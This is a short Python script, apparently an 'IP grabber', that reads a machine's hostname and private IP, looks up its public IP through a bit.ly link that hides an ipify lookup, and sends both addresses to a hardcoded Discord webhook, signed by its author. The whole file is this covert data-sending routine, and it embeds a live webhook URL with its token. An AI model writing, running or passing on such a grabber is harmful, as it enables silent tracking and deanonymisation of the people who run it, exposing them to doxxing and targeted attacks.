import requests 
import socket
from base64 import b64decode
from discord_webhook import DiscordWebhook
from urllib.request import Request, urlopen


hook = 'https://discordapp.com/api/webhooks/742819597350207549/qnfuVIZcz2z15Uka0WzRbId5ohUlgzbduzZh7UJTHOPc4d95xEV8VMK78jSCiqv1Pv0M'


PIP = socket.gethostname()
Privateip = socket.gethostbyname(PIP)
ip = urlopen(Request("https://bit.ly/2PTxfFq")).read().decode().strip()
#bitly      -->      https://api.ipify.org/

# Sends the ip to an webhook
webhook = DiscordWebhook(url=f'{hook}', content=f'Public Ip Adress: {ip} \nPrivate Ip Adress: {Privateip}\n\nMade by Cuet#1337')
response = webhook.execute()
# Ending.
#
# Created by Cuet#1337
#
#